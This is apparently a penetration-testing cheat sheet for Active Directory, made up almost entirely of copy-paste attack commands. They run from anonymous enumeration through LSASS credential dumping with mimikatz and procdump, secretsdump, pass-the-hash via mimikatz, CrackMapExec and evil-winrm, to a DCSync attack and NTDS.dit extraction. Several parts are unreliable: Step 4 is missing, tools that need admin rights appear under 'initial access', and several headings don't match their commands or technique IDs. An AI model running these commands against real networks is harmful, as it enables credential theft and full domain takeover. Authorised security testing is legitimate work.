# **Comprehensive Active Directory (AD) Penetration Testing Methodology**

## **Scenario:**
You have only the **IP address of the Domain Controller (DC)** and must conduct a full Active Directory pentest. This guide includes **multiple alternative techniques for each step**, ensuring redundancy. Each method is mapped to **MITRE ATT&CK Techniques (TTPs)** where applicable.

---

# **🛠 Step 1: Information Gathering (Recon) (T1595, T1592, T1590)**
**Objective:** Identify the domain name, live hosts, users, and exposed services.

### **1.1 Identify Live Hosts & Domain Name**
- **Primary Method: DNS Reverse Lookup (T1590.005)**
  ```bash
  nslookup <DC_IP>
  ```
- **Alternative Methods:**
  - **Find domain via NetBIOS (if 137/139 open) (T1590.005):**
    ```bash
    nmblookup -A <DC_IP>
    ```
  - **Identify DC using SMB (if 445 open) (T1590.002):**
    ```bash
    crackmapexec smb <DC_IP> --shares
    ```
  - **Check SSL certificates (if 443 open) (T1590.004):**
    ```bash
    openssl s_client -connect <DC_IP>:443 | grep "CN="
    ```
  - **Discover live hosts via ICMP scan (T1595.002):**
    ```bash
    fping -a -g <IP_RANGE>
    ```
  - **Enumerate domain using nbtscan (T1590.005):**
    ```bash
    nbtscan -r <IP_RANGE>
    ```
  - **Enumerate via CrackMapExec (T1590.002):**
    ```bash
    crackmapexec smb <DC_IP> -u '' -p '' --shares
    ```

---

# **📡 Step 2: Enumerating Active Directory (No Authentication) (T1590, T1592.002, T1592.004)**
**Objective:** Extract usernames, shares, and AD structure **without credentials**.

### **2.1 Enumerate Users & Domain Info**
- **Primary Method: LDAP Anonymous Bind (T1592.002)**
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -s base namingContexts
  ```
- **Alternative Methods:**
  - **Extract domain name from SMB (if 445 open) (T1592.002):**
    ```bash
    smbclient -L //<DC_IP> -N
    ```
  - **Use Kerberos brute-force with common names (T1595.002):**
    ```bash
    kerbrute userenum -d corp.local --dc <DC_IP> users.txt
    ```
  - **Check printer services (for usernames in print jobs) (T1592.002):**
    ```bash
    enum4linux -a <DC_IP>
    ```
  - **Enumerate domain SID (T1592.002):**
    ```bash
    rpcclient -U "" <DC_IP> -c "enumdomusers"
    ```
  - **Using BloodHound with SharpHound (T1592.002):**
    ```powershell
    SharpHound.exe -c All
    ```

### **2.2 Enumerate Shares & GPOs**
- **Primary Method: SMB Enumeration (T1590.002)**
  ```bash
  crackmapexec smb <DC_IP> -u '' -p '' --shares
  ```
- **Alternative Methods:**
  - **Check for readable GPO files (group policies may contain creds) (T1592.004):**
    ```bash
    smbclient //DC_IP/SYSVOL -N
    ```
  - **Search for passwords in SYSVOL (T1552.006):**
    ```bash
    find . -name "*.xml" | xargs grep -i password
    ```
  - **List accessible shares manually via SMB (T1590.002):**
    ```bash
    smbmap -H <DC_IP>
    ```
  - **Enumerate domain trust relationships via RPC (T1592.002):**
    ```bash
    rpcclient -U "" <DC_IP> -c "enumdomgroups"
    ```
  - **Using BloodHound for Trust Enumeration (T1592.002):**
    ```powershell
    Invoke-BloodHound -CollectionMethod All -Verbose -OutputDirectory C:\temp
    ```

---

# **🔑 Step 3: Gaining Initial Access (T1078.002, T1557.002, T1110.003)**
**Objective:** Obtain valid credentials for a **low-privileged user**.

### **3.1 Credential Dumping via Mimikatz (T1003.001)**
- **Primary Method (Windows Elevated CMD):**
  ```powershell
  mimikatz
  sekurlsa::logonpasswords
  ```
- **Alternative Methods:**
  - **Dump credentials from LSASS using Task Manager:**
    ```powershell
    procdump -accepteula -ma lsass.exe lsass.dmp
    ```
  - **Extracting NTLM Hashes using Impacket:**
    ```bash
    secretsdump.py -just-dc corp.local/user:password@<DC_IP>
    ```
  - **Using Rubeus for Ticket Extraction (T1558.003):**
    ```powershell
    Rubeus.exe dump /format:kirbi
    ```
  
---

# **📡 Step 5: Lateral Movement (T1550.001, T1558.002, T1021.002)**
**Objective:** Expand access to **other machines in the domain**.

### **5.1 Over-Pass-the-Hash (T1550.002)**
- **Primary Method:**
  ```powershell
  mimikatz
  sekurlsa::pth /user:user /domain:corp.local /ntlm:<HASH>
  ```
- **Alternative Methods:**
  - **Using CrackMapExec for Lateral Movement:**
    ```bash
    crackmapexec smb <DC_IP> -u user -H <NTLM_HASH>
    ```
  - **Using Evil-WinRM:**
    ```bash
    evil-winrm -i <DC_IP> -u user -H <NTLM_HASH>
    ```
  
---

# **🏆 Step 6: Domain Controller Compromise (T1003.002, T1555.003)**
**Objective:** Gain **full control over the AD environment**.

### **6.1 DCSync Attack (T1003.002)**
- **Primary Method:**
  ```powershell
  mimikatz
  lsadump::dcsync /domain:corp.local /user:Administrator
  ```
- **Alternative Methods:**
  - **Extracting NTDS.dit via Ntdsutil:**
    ```powershell
    ntdsutil "ac i ntds" "ifm" "create full c:\ntds" q q
    ```

